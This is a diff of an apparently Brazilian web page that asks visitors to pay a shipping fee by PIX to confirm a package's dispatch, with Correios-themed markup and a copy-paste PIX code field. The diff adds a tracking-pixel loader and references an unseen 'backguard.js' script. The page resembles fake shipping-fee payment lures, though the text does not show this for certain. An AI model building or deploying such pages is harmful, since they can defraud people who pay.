@@ -13,9 +13,19 @@
     <meta name="description" content="Pague o frete via PIX para confirmar o envio da sua bag.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&family=Rawline:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&family=Rawline:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=7.6">
     <script src="/backguard.js?v=1.6"></script>
+    <script>
+        window.pixelId = "697185be2058fdd08c7d7436";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
 </head>
 
 <body data-page="pix">
@@ -139,10 +149,12 @@
                     </div>
 
                     <div class="pix-correios-copy">
-                        <label class="pix-correios-copy-label" for="pix-correios-code">Codigo PIX (Copiar e Colar)</label>
+                        <label class="pix-correios-copy-label" for="pix-correios-code">Codigo PIX (Copiar e
+                            Colar)</label>
                         <div class="pix-correios-copy-row">
                             <input id="pix-correios-code" class="pix-correios-copy-input" type="text" readonly>
-                            <button id="btn-copy-pix-correios" class="pix-correios-copy-btn" type="button">COPIAR</button>
+                            <button id="btn-copy-pix-correios" class="pix-correios-copy-btn"
+                                type="button">COPIAR</button>
                         </div>
                     </div>
 
@@ -180,10 +192,3 @@
 </body>
 
 </html>
-
-
-
-
-
-
-
